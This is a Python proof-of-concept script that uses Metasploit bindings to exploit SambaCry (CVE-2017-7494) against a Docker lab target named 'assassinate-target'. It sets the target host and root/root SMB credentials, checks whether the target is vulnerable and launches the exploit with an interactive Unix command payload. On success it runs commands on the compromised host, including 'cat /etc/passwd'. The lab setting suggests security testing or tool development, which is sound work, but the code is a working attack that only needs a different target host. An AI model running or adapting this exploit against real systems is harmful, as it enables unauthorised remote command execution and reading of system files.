"""Sambacry (CVE-2017-7494) exploit POC using Pyo3 -> Magnus -> MSF.

Target: assassinate-target (Docker container on assassinate-network)
Exploit: exploit/linux/samba/is_known_pipename
Payload: cmd/unix/interact

Usage (from host):
    export MSF_ROOT=/home/astark/Projects/metasploit-framework
    .venv/bin/python python/examples/sambacry_poc.py

Usage (from Docker dev container):
    python python/examples/sambacry_poc.py
"""

from __future__ import annotations

import os
import time

import msf

# Target can be set via env var for flexibility (Docker vs host testing)
TARGET_HOST = os.environ.get("TARGET_HOST", "assassinate-target")
EXPLOIT = "exploit/linux/samba/is_known_pipename"
PAYLOAD = "cmd/unix/interact"


def main() -> int:
    msf_root = os.environ.get("MSF_ROOT", "/opt/metasploit-framework")
    print(f"[+] Sambacry POC against {TARGET_HOST} (MSF: {msf_root})")
    print("[+] Target Samba version: 4.6.3 (vulnerable to CVE-2017-7494)")

    try:
        print("[+] Initializing MSF...")
        msf.init_msf(msf_root)
        print("[+] MSF initialized")

        version = msf.framework_version()
        print(f"[+] MSF Version: {version}")

        print(f"\n[+] Creating module instance for {EXPLOIT}...")
        module = msf.create_module(EXPLOIT)
        print(f"[+] Module created: {module.fullname}")
        print(f"[+] Rank: {module.rank}")

        # Configure options using attribute-style access
        print("\n[+] Setting module options...")
        module.options.RHOSTS = TARGET_HOST
        module.options.SMB_SHARE_NAME = "myshare"
        module.options.SMB_USER = "root"
        module.options.SMB_PASS = "root"
        print(f"    RHOSTS = {module.options.RHOSTS}")
        print(f"    SMB_SHARE_NAME = {module.options.SMB_SHARE_NAME}")
        print(f"    SMB_USER = {module.options.SMB_USER}")

        # Run vulnerability check
        print("\n[+] Running vulnerability check...")
        check_result = module.check()
        print(f"[+] Check result: {check_result}")

        if "Safe" in check_result or "Unsupported" in check_result:
            print("[-] Target is not vulnerable or check is unsupported")
            return 1

        if "Appears" in check_result or "Detected" in check_result:
            print("[+] Target appears to be vulnerable!")

        # Validate configuration
        print("\n[+] Validating module configuration...")
        if not module.validate():
            print("[-] Module validation failed!")
            return 1
        print("[+] Configuration valid!")

        # Run the exploit
        print(f"\n[+] Running Sambacry exploit {EXPLOIT}...")
        print(f"[+] Payload: {PAYLOAD}")
        print("[+] This may take up to 60 seconds...")

        start_time = time.time()
        session = module.exploit(PAYLOAD, timeout=60)
        elapsed = time.time() - start_time

        print(f"[+] Exploit completed in {elapsed:.1f}s")

        if session is not None:
            print(f"\n[+] SUCCESS! Got session!")
            print(f"    Session ID:   {session.sid}")
            print(f"    Session Type: {session.session_type}")
            print(f"    Target Host:  {session.host}")
            print(f"    Target Port:  {session.port}")
            print(f"    Alive:        {session.alive}")
            print(f"    Via Exploit:  {session.via_exploit}")

            print("\n[+] Executing commands on target...")

            print("\n[+] Running 'id':")
            try:
                output = session.run_cmd("id")
                print(f"    {output.strip()}")
            except Exception as e:
                print(f"[-] Failed to run command: {e}")

            print("\n[+] Running 'whoami':")
            try:
                output = session.run_cmd("whoami")
                print(f"    {output.strip()}")
            except Exception as e:
                print(f"[-] Failed to run command: {e}")

            print("\n[+] Running 'uname -a':")
            try:
                output = session.run_cmd("uname -a")
                print(f"    {output.strip()}")
            except Exception as e:
                print(f"[-] Failed to run command: {e}")

            print("\n[+] Running 'cat /etc/passwd | head -5':")
            try:
                output = session.run_cmd("cat /etc/passwd | head -5")
                for line in output.strip().split("\n"):
                    print(f"    {line}")
            except Exception as e:
                print(f"[-] Failed to run command: {e}")

            print("\n" + "=" * 50)
            print("  EXPLOITATION SUCCESSFUL!")
            print("=" * 50)

            # Optionally kill session
            # session.kill()
            # print("\n[+] Session killed")

            return 0
        else:
            print("[-] Exploit completed but no session was created")
            print("    Possible causes:")
            print("    - Share 'myshare' doesn't exist or isn't writable")
            print("    - Target doesn't allow write access with provided credentials")
            print("    - SMB signing required (common in newer configs)")
            print("    - Network connectivity issue")
            return 1

    except msf.AssassinateError as exc:
        print(f"\n[-] Error: {exc}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
